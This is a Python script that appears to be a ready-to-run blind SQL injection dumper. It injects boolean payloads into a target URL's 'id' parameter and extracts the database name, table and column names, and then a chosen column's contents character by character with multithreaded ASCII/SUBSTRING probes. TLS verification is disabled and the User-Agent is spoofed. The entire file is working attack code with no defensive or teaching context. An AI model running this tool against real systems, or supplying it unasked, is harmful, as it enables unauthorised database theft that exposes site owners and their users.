import requests
import urllib3
import sys
from concurrent.futures import ThreadPoolExecutor, as_completed
from time import sleep

# Disable SSL warnings (useful for self-signed certificates)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Constants
TRUE_CONDITION = "1"
FALSE_CONDITION = "0"
MAX_THREADS = 20
MAX_RETRIES = 20
REQUEST_TIMEOUT = 30

def send_request(base_url, payload, retries=MAX_RETRIES):
    """Sends the payload to the target and returns the response with retries."""
    url = f"{base_url}?id=1{payload}"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36"
    }
    for attempt in range(retries):
        try:
            response = requests.get(url, headers=headers, timeout=REQUEST_TIMEOUT, verify=False)
            response.raise_for_status()
            return response.text
        except requests.exceptions.RequestException as e:
            print(f"[!] Request failed (attempt {attempt + 1}/{retries}): {e}")
            sleep(5)
    return ""

def find_payload(base_url):
    """Automatically detects a valid true/false condition payload."""
    print("[+] Detecting valid payload...")
    true_payload = "' AND 1=1%23"
    false_payload = "' AND 1=2%23"

    true_response = send_request(base_url, true_payload)
    false_response = send_request(base_url, false_payload)

    if TRUE_CONDITION in true_response and FALSE_CONDITION not in true_response:
        print("[+] True/False condition payload detected successfully!")
        return {
            "true": true_payload,
            "false": false_payload,
        }
    else:
        print("[!] Failed to detect valid true/false condition payload.")
        exit(1)

def extract_length(base_url, query, payloads):
    """Extracts the length of a result set."""
    length = 0
    while True:
        payload = f"' AND LENGTH(({query}))>{length}%23"
        response = send_request(base_url, payload)
        if TRUE_CONDITION not in response:
            break
        length += 1
        if length > 100:
            print("[!] Length extraction failed: Exceeded maximum attempts.")
            break
    return length

def extract_character(base_url, query, index, payloads):
    """Extracts a single character at a specific index using multithreading."""
    def character_test(char_code):
        payload = f"' AND ASCII(SUBSTRING(({query}), {index}, 1))={char_code}%23"
        response = send_request(base_url, payload)
        if TRUE_CONDITION in response:
            return chr(char_code)
        return None

    with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
        futures = {executor.submit(character_test, char_code): char_code for char_code in range(32, 127)}
        for future in as_completed(futures):
            result = future.result()
            if result:
                return result
    return None

def extract_data(base_url, query, payloads):
    """Extracts data based on the given query."""
    length = extract_length(base_url, query, payloads)
    result = ""
    for i in range(1, length + 1):
        char = extract_character(base_url, query, i, payloads)
        if char:
            result += char
    return result, length

if __name__ == "__main__":
    # Step 0: Get URL from user
    if len(sys.argv) < 2:
        print("Usage: python3 My-app.py <URL>")
        sys.exit(1)

    base_url = sys.argv[1]

    # Step 1: Detect payloads
    payloads = find_payload(base_url)

    # Step 2: Extract database name and its length
    print("[+] Extracting database name...")
    database_name, database_length = extract_data(base_url, "SELECT DATABASE()", payloads)
    print(f"Database Name: {database_name} (Length: {database_length})")

    # Step 3: Extract table names
    print("[+] Extracting table names...")
    tables_query = f"SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema='{database_name}'"
    table_names, _ = extract_data(base_url, tables_query, payloads)
    table_list = table_names.split(",")
    print("Available Tables:")
    for idx, table in enumerate(table_list, start=1):
        print(f"{idx}. {table}")

    # Step 4: Ask user which table to dump
    table_choice = int(input("Enter the number of the table you want to dump: ")) - 1
    selected_table = table_list[table_choice]
    print(f"Selected Table: {selected_table} (Length: {len(selected_table)})")

    # Step 5: Extract column names from the selected table
    print("[+] Extracting column names...")
    columns_query = f"SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='{selected_table}' AND table_schema='{database_name}'"
    column_names, _ = extract_data(base_url, columns_query, payloads)

    # Split and display column names
    if column_names:
        column_list = column_names.split(",")
        print("Available Columns:")
        for idx, column in enumerate(column_list, start=1):
            print(f"{idx}. {column}")
    else:
        print("[!] No columns found for the selected table.")
        sys.exit(1)

    # Step 6: Select and extract data for a single column
    selected_columns = {}
    column_choice = int(input("Enter the column number you want to dump: ").strip())
    column_name = column_list[column_choice - 1]
    print(f"[+] Extracting data from column '{column_name}'...")
    data_query = f"SELECT GROUP_CONCAT({column_name}) FROM {selected_table}"
    column_data, column_data_length = extract_data(base_url, data_query, payloads)
    selected_columns[column_name] = {"data": column_data, "length": column_data_length}
    print(f"Data from {selected_table}.{column_name}: {column_data} (Length: {column_data_length})")

    # Step 7: Display summary
    print("\n=== Summary ===")
    print(f"Database Name: {database_name} (Length: {database_length})")
    print(f"Selected Table: {selected_table} (Length: {len(selected_table)})")
    for column_name, column_info in selected_columns.items():
        print(f"Column: {column_name} = {column_info['data']} (Length: {column_info['length']})")